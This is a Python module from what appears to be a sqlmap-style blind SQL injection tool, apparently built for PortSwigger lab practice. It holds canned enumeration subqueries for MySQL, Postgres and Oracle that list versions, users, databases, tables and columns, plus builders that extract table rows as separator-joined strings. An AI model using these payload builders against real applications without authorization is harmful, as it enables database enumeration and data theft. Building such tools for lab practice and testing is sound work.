"""Canned enumeration subqueries, keyed by kind and dialect.

Presentation-layer resolution of user input, no network I/O -- same role as
``cli/report.py``/``cli/request_file.py``. Spares the user from hand-writing
the SQL for generic reconnaissance questions ("what tables exist?", "what
columns does this table have?", engine version, current user), the same way
sqlmap's ``--dbs``/``--tables``/``--columns``/``--current-user`` do.

Deliberately limited to *structural* queries that do not assume a schema.
"Give me administrator's password" is NOT catalogued here: the table/column/
user vary per target (the PortSwigger labs only share ``users``/``password``/
``administrator`` by convention). Use ``--expression`` for anything schema
specific.

Each template produces a single string value -- list kinds aggregate their
rows into one comma-separated string -- so the character-by-character
extractor needs no changes.
"""

import string

AVAILABLE_KINDS = (
    "columns", "count", "current-db", "current-user",
    "databases", "tables", "version",
)

LIST_KINDS = ("columns", "databases", "tables")
LIST_EXTRA_CHARS = "ABCDEFGHIJKLMNOPQRSTUVWXYZ_,"

DUMP_EXTRA_CHARS = (
    "~,._ -@#$%&*()[]{}|/\\:;!?<>=+'"
    + string.ascii_uppercase
    + string.digits
)

ROW_SEPARATOR = "~"

_CATALOG: dict[str, dict[str, str]] = {
    "version": {
        "mysql": "(SELECT VERSION())",
        "postgres": "(SELECT version())",
        "oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
    },
    "current-user": {
        "mysql": "(SELECT CURRENT_USER())",
        "postgres": "(SELECT current_user)",
        "oracle": "(SELECT user FROM dual)",
    },
    "current-db": {
        "mysql": "(SELECT DATABASE())",
        "postgres": "(SELECT current_database())",
        "oracle": "(SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual)",
    },
    "databases": {
        "mysql": "(SELECT GROUP_CONCAT(schema_name SEPARATOR ',') FROM information_schema.schemata)",
        "postgres": "(SELECT string_agg(datname, ',') FROM pg_database)",
        "oracle": "(SELECT LISTAGG(username, ',') WITHIN GROUP (ORDER BY username) FROM all_users)",
    },
    "tables": {
        "mysql": (
            "(SELECT GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables "
            "WHERE table_schema={db})"
        ),
        "postgres": (
            "(SELECT string_agg(table_name, ',') FROM information_schema.tables "
            "WHERE table_schema='{schema}')"
        ),
        "oracle": (
            "(SELECT LISTAGG(table_name, ',') WITHIN GROUP (ORDER BY table_name) "
            "FROM all_tables WHERE owner={owner})"
        ),
    },
    "columns": {
        "mysql": (
            "(SELECT GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns "
            "WHERE table_name='{table}'{db_filter})"
        ),
        "postgres": (
            "(SELECT string_agg(column_name, ',') FROM information_schema.columns "
            "WHERE table_name='{table}'{schema_filter})"
        ),
        "oracle": (
            "(SELECT LISTAGG(column_name, ',') WITHIN GROUP (ORDER BY column_name) "
            "FROM all_tab_columns WHERE table_name='{table}'{owner_filter})"
        ),
    },
    "count": {
        "mysql": "(SELECT CAST(COUNT(*) AS CHAR) FROM {qualified_table})",
        "postgres": "(SELECT COUNT(*)::text FROM {qualified_table})",
        "oracle": "(SELECT TO_CHAR(COUNT(*)) FROM {qualified_table})",
    },
}


def _qualify_table(dialect: str, table: str, database: str | None) -> str:
    if database:
        return f"{database}.{table}"
    return table


def _db_ref(dialect: str, database: str | None) -> str:
    if database:
        if dialect == "mysql":
            return f"'{database}'"
        if dialect == "oracle":
            return f"UPPER('{database}')"
        return f"'{database}'"
    if dialect == "mysql":
        return "DATABASE()"
    if dialect == "oracle":
        return "USER"
    return "'public'"


def build_enum_expression(
    kind: str,
    dialect: str,
    *,
    table: str | None = None,
    database: str | None = None,
) -> str:
    """Return the canned subquery for one enumeration ``kind`` and ``dialect``.

    ``table`` is required for ``columns`` and ``count``.  ``database``
    optionally scopes ``tables``, ``columns`` and ``count`` to a specific
    schema/database; when omitted, each dialect's default is used.
    """
    if kind not in _CATALOG:
        raise ValueError(
            f"unknown enum kind: {kind!r}. Available: {', '.join(AVAILABLE_KINDS)}"
        )
    by_dialect = _CATALOG[kind]
    if dialect not in by_dialect:
        raise ValueError(
            f"enum {kind!r} is not catalogued for dialect {dialect!r}. "
            f"Available: {', '.join(sorted(by_dialect))}"
        )
    template = by_dialect[dialect]

    if kind == "count":
        if not table or not table.strip():
            raise ValueError("enum 'count' requires --table")
        table_value = table.upper() if dialect == "oracle" else table
        qualified = _qualify_table(dialect, table_value, database)
        return template.format(qualified_table=qualified)

    if kind == "columns":
        if not table or not table.strip():
            raise ValueError("enum 'columns' requires --table naming the table to inspect")
        table_value = table.upper() if dialect == "oracle" else table
        db_filter = ""
        schema_filter = ""
        owner_filter = ""
        if dialect == "mysql":
            db_filter = f" AND table_schema={_db_ref(dialect, database)}"
        elif dialect == "postgres":
            schema_filter = f" AND table_schema={_db_ref(dialect, database)}"
        elif dialect == "oracle":
            owner_filter = f" AND owner={_db_ref(dialect, database)}"
        return template.format(
            table=table_value,
            db_filter=db_filter,
            schema_filter=schema_filter,
            owner_filter=owner_filter,
        )

    if kind == "tables":
        db = _db_ref(dialect, database)
        if dialect == "mysql":
            return template.format(db=db)
        if dialect == "postgres":
            schema = database if database else "public"
            return template.format(schema=schema)
        if dialect == "oracle":
            return template.format(owner=db)

    return template


def build_row_expression(
    dialect: str,
    columns: list[str],
    *,
    table: str,
    database: str | None = None,
    offset: int,
) -> str:
    """Build a subquery that extracts one row as a ~-separated string.

    Each column is wrapped in COALESCE to handle NULLs.  The result is a
    single string like ``val1~val2~val3`` that the caller splits by ``~``.
    """
    if not columns:
        raise ValueError("columns list cannot be empty")
    if not table or not table.strip():
        raise ValueError("table is required")
    if offset < 0:
        raise ValueError("offset cannot be negative")

    table_value = table.upper() if dialect == "oracle" else table
    qualified = _qualify_table(dialect, table_value, database)
    sep = ROW_SEPARATOR

    if dialect == "mysql":
        coalesced = ", ".join(
            f"COALESCE(CAST(`{c}` AS CHAR), 'NULL')" for c in columns
        )
        return (
            f"(SELECT CONCAT_WS('{sep}', {coalesced}) "
            f"FROM {qualified} LIMIT 1 OFFSET {offset})"
        )

    if dialect == "postgres":
        parts = [f'COALESCE("{c}"::text, \'NULL\')' for c in columns]
        concatenated = f"||'{sep}'||".join(parts)
        return (
            f"(SELECT {concatenated} "
            f"FROM {qualified} LIMIT 1 OFFSET {offset})"
        )

    if dialect == "oracle":
        parts = [f"COALESCE(CAST({c} AS VARCHAR2(4000)), 'NULL')" for c in columns]
        concatenated = f"||'{sep}'||".join(parts)
        return (
            f"(SELECT {concatenated} FROM "
            f"(SELECT t.*, ROWNUM rn FROM {qualified} t) "
            f"WHERE rn={offset + 1})"
        )

    raise ValueError(f"unsupported dialect for row expression: {dialect!r}")
